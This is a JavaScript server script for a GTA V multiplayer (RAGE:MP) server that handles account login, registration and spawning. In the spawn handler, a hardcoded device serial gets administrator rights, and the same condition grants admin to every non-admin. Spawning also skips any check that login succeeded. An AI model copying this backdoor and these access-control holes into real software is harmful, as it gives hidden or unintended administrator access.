gm.utility      = require('../core/utility.js');

mp.events.add('sendShitToServer', (player, user, pass, state) =>
{
    switch(state)
    {
        case 0:
        {
            gm.mysql.Handle.query("SELECT password FROM `user` WHERE name = ? LIMIT 1", [user], function(e, result)
            {
                if(result.length)
                {
                    let sqlPassword = result[0]["password"];

                    gm.bcrypt.compare(pass, sqlPassword, function(err, res)
                    {
                        if(res == true)
                        {
                            console.log("<LOG> " + player.name + " has authenticated!");

                            player.call("authReply", ["success"]);
                        }
                        else
                        {
                            player.outputChatBox("Wrong Password!");
                            console.log("<LOG> " + player.name + " has entered the wrong password!");
                            player.call("authReply", ["wrongpass"]);
                        }
                    });
                }
            });
            break;
        }
        case 1:
        {
            gm.mysql.Handle.query("SELECT `id` FROM `user` WHERE name = ? LIMIT 1", [user], function(e, result)
            {
                if(result.length)
                {
                    // The account already exists!
                    player.outputChatBox("acc exists nerd");
                }
                else
                {
                    gm.bcrypt.genSalt(10, function(err, res)
                    {
                        var hash = gm.bcrypt.hashSync(pass, res);

                        gm.mysql.Handle.query("INSERT INTO `user` SET name = ?, password = ?, ip = ?, serial = ?, admin = ?, premium = ?, created_at = CURRENT_TIMESTAMP, last_login = CURRENT_TIMESTAMP",
                        [user, hash, player.ip, player.serial, 0, 0], function(e, result)
                        {
                            player.name = user;
                            player.call("authReply", ["success"]);
                            console.log("<SRV> " + player.name + " has just registered for the first time.");
                        });
                    });
                }
            });
            break;
        }
    }
});

mp.events.add("testSpawn", (player) =>
{
    gm.utility.loadAccount(player);
	player.logged = 1;

    player.outputChatBox("Welcome to Lunar Drift: <span style='color:#e038ac'>" + player.name + "</span><span style='color:#ffffff'>. Make sure you join our Discord: https://discord.gg/v5HQcqw!</span>");
    player.outputChatBox("<span style='color:#cf0b0b'>" + "<SRV>" + "</span> <span style='color:#ffffff'>To view a list of commands type /help!</span>");

    player.spawn(new mp.Vector3(-2206.32, -448.172, 329.38));
    player.model = mp.joaat('mp_m_freemode_01');

    setTimeout(function() // allows asynchronous sql loading to take place
    {
        if(player.serial == "F1F242ACB9FC4270B0CC4A00092E9760DB9A1E98C62022D000126B3C7E0A7B40EE1C907856001BA8E19C395C62447200CEDC0024E586BA683D849AC8707A7E40" || player.admin < 1) player.admin = 2;
        if (player.admin > 0)
        {
            console.log("<LOG> " + player.name + " has logged in as a level: " + player.admin + " administrator!");
            player.outputChatBox("<span style='color:#cf0b0b'>" + "<SRV>" + "</span><span style='color:#ffffff'>Type /ah to view a list of administrator actions!</span>");
        }
    }, 1000);

});
